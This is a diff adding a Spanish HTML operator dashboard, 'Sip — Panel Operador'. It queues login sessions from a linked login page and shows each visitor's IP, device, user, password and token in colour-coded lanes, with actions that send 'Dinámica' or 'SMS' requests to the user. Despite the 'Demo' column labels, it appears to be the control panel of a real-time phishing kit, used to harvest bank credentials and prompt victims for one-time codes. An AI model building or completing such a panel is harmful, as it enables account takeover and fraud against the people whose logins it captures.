@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <title>Sip — Panel de Control Operador</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="css/panel.css" />
+</head>
+<body>
+  <main class="dash">
+    <header class="toolbar">
+      <div class="toolbar__left">
+        <h1 class="toolbar__title">Sip — Panel Operador</h1>
+        <span class="toolbar__meta">Sesiones: <strong id="rowCount">0</strong> · usa Dinámica o SMS en Acciones
+          <button type="button" class="sound-toggle" id="audioStatus" aria-pressed="true" title="Activar o desactivar sonido">🔊 Sonido: ON</button>
+        </span>
+      </div>
+      <div class="toolbar__actions">
+        <button type="button" class="btn btn--ok" id="btnClean">Limpiar</button>
+        <button type="button" class="btn btn--done" id="btnExport" style="background: #0b5ed7;">Guardar</button>
+        <a class="btn btn--ghost" href="/cuenta" target="_blank">Ir al login</a>
+      </div>
+    </header>
+
+    <p class="empty is-visible" id="emptyState">
+      Cola vacía. En el login pulsa Iniciar Sesión: el usuario llega aquí ordenado para elegir Dinámica o SMS.
+    </p>
+
+    <div class="sections" id="sections">
+      <section class="lane lane--1" data-lane="0">
+        <div class="lane__head">
+          <span class="lane__title">Azul</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>Demo user</th>
+              <th>Demo pass</th>
+              <th>Demo token</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="0"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--2" data-lane="1">
+        <div class="lane__head">
+          <span class="lane__title">Verde</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>Demo user</th>
+              <th>Demo pass</th>
+              <th>Demo token</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="1"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--3" data-lane="2">
+        <div class="lane__head">
+          <span class="lane__title">Rojo</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>Demo user</th>
+              <th>Demo pass</th>
+              <th>Demo token</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="2"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--4" data-lane="3">
+        <div class="lane__head">
+          <span class="lane__title">Gris</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>Demo user</th>
+              <th>Demo pass</th>
+              <th>Demo token</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="3"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--5" data-lane="4">
+        <div class="lane__head">
+          <span class="lane__title">Amarillo</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>Demo user</th>
+              <th>Demo pass</th>
+              <th>Demo token</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="4"></tbody>
+        </table>
+      </section>
+    </div>
+
+    <p class="footer-note" id="hint">
+      En Acciones: Dinámica o SMS envían la solicitud al usuario.
+    </p>
+  </main>
+
+  <script src="js/panel.js?v=sound-toggle"></script>
+</body>
+</html>
